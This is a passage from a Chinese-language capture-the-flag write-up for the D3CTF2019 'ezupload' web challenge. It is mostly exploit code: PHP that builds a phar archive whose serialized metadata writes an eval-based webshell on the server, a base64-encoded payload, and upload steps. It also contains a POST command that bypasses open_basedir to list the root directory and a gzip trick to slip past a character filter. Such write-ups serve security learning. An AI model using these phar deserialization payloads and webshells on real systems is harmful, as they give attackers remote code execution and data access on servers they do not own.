class="line">   <span class="variable">$a</span>-&gt;userdir=<span class="string">&quot;/upload/e0ee64a13ff7a0b04333c1d51fbbeadf&quot;</span>;</span><br><span class="line">   <span class="variable">$o</span> = <span class="keyword">new</span> <span class="title function_ invoke__">dir</span>();</span><br><span class="line">   <span class="variable">$o</span>-&gt;userdir=<span class="variable">$a</span>;</span><br><span class="line">   <span class="variable">$o</span>-&gt;filename=<span class="string">&quot;/var/www/html/887a185b1a408019/upload/e0ee64a13ff7a0b04333c1d51fbbeadf/webshell&quot;</span>;	<span class="comment">//最后会生成webshell.txt</span></span><br><span class="line">   <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将要反序列化的对象存入meta-data</span></span><br><span class="line">   <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">   <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>与前面操作相同</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">url = <span class="string">&#x27;&#x27;&#x27;data://image/gif;base64,R0lGODlhIF9fSEFMVF9DT01QSUxFUigpOyA/Pg0KLQEAAAEAAAARAAAAAQAAAAAA9wAAAE86Mzoi</span></span><br><span class="line"><span class="string">ZGlyIjozOntzOjc6InVzZXJkaXIiO086MzoiZGlyIjozOntzOjc6InVzZXJkaXIiO3M6NDA6Ii91</span></span><br><span class="line"><span class="string">cGxvYWQvZTBlZTY0YTEzZmY3YTBiMDQzMzNjMWQ1MWZiYmVhZGYiO3M6MzoidXJsIjtOO3M6ODoi</span></span><br><span class="line"><span class="string">ZmlsZW5hbWUiO047fXM6MzoidXJsIjtOO3M6ODoiZmlsZW5hbWUiO3M6Nzk6Ii92YXIvd3d3L2h0</span></span><br><span class="line"><span class="string">bWwvODg3YTE4NWIxYTQwODAxOS91cGxvYWQvZTBlZTY0YTEzZmY3YTBiMDQzMzNjMWQ1MWZiYmVh</span></span><br><span class="line"><span class="string">ZGYvd2Vic2hlbGwiO30IAAAAdGVzdC50eHQEAAAATurUZAQAAAAMfn/YpAEAAAAAAAB0ZXN0Nw1j</span></span><br><span class="line"><span class="string">IHqtIaW4cyxLqtXaivqqZtUhOAJTZ2M8GgeF7DoDAAAAR0JNQg==&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">getinfo(purl, <span class="string">&quot;phar2.gif&quot;</span>, <span class="string">&#x27;upload&#x27;</span>)</span><br><span class="line">getinfo(<span class="string">&#x27;phar://upload/e0ee64a13ff7a0b04333c1d51fbbeadf/phar2.gif&#x27;</span>, <span class="string">&#x27;2&#x27;</span>, <span class="string">&#x27;upload&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>得到 <code>your file in : upload/e0ee64a13ff7a0b04333c1d51fbbeadfyour file in : . .. .htaccess 1 2 &lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;.txt ...</code> ，说明上传成功</p>
+<p>再访问<code>887a185b1a408019/upload/e0ee64a13ff7a0b04333c1d51fbbeadf/webshell.txt</code>，连接蚁剑获得flag</p>
+<p>直接post命令的话要进行还要绕过目录穿越限制</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>, <span class="string">&#x27;/&#x27;</span>);<span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;/&#x27;</span>));</span><br></pre></td></tr></table></figure></li>
+</ul>
+<h3 id="法二："><a href="#法二：" class="headerlink" title="法二："></a>法二：</h3><ul>
+<li><p>直接在userdir处传木马</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dir</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$userdir</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$url</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$filename</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">dir</span>();</span><br><span class="line"><span class="variable">$a</span>-&gt;filename=<span class="string">&#x27;/var/www/html/887a185b1a408019/upload/e0ee64a13ff7a0b04333c1d51fbbeadf/webshell&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;userdir=<span class="string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>;		</span><br><span class="line"><span class="variable">$phar</span>=<span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>(); </span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&#x27;GIF89a&#x27;</span>.<span class="string">&quot;__HALT_COMPILER();&quot;</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$a</span>); </span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>);</span><br><span class="line"><span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>但 <code>&lt;</code> 会被过滤</p>
+<p>phar协议能够解压zip,gzip等压缩包，因此gzip压缩一下,<code>gzip phar.phar</code>，然后同样两步上传，触发序列化</p>
+<p>访问<code>887a185b1a408019/upload/e0ee64a13ff7a0b04333c1d51fbbeadf/webshell.txt</code></p>
+</li>
+</ul>
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	<!-- 
+		<span id="/2023/08/10/D3CTF2019-ezupload/" class="leancloud-visitors view" data-flag-title="D3CTF2019-ezupload">
+			<i class="fa fa-eye"></i> <i class="leancloud-visitors-count"></i>
+		</span>
+	 -->
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2023/08/08/UUCTF2022-uploadandinject/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+		<section id="comments" class="comments">
+			<style>
+			.comments{margin:30px;padding:10px;background:rgb(0, 0, 0)}
+			@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#000}}
+			</style>
+			<div id="vcomment" class="comment"></div>
+<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+<script src="https://cdnjs.loli.net/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script>
+var valineConfig = {"enable":true,"appId":"7m4bFydh606FgGbxRPsI8M6l-gzGzoHsz","appKey":"edXvAXhOXIvksZqtq8b5AXWj","placeholder":"input your comment: ","visitor":true,"avatar":"retro","lang":"en","metaPlaceholder":{"nick":"nick","mail":"mail","link":"link"},"requiredFields":["nick","mail","link"],"pageView":true}
+valineConfig.el='#vcomment';
+new Valine(valineConfig);
+    // new Valine({
+    //     el: '#vcomment',
+    //     appId: "",
+    //     appKey: "",
+    //     placeholder: "input your comment: ",
+    //     avatar:"retro",
+    //     visitor: "true",
+    //     requiredFields: "nick,mail,link".split(','),
+    // });
+</script>
+
+		</section>
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2023-08-10 
+	</div>
+	
+
+	<!-- categories -->
+    
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#categorys"><i class="fa fa-folder"></i></a>	
+    <ul id="categorys" class="tag_box list-unstyled collapse in">
+          
+  <li>
+    <li><a href="/categories/web-wp/">web-wp<span>21</span></a></li>
+  </li>
+
+    </ul>
+	</div>
+	
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/CTF/">CTF<span>39</span></a></li> <li><a href="/tags/nssctf/">nssctf<span>29</span></a></li> <li><a href="/tags/web/">web<span>23</span></a></li> <li><a href="/tags/upload/">upload<span>5</span></a></li> <li><a href="/tags/D3CTF2019/">D3CTF2019<span>1</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer>  </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+</body>
+   </html>
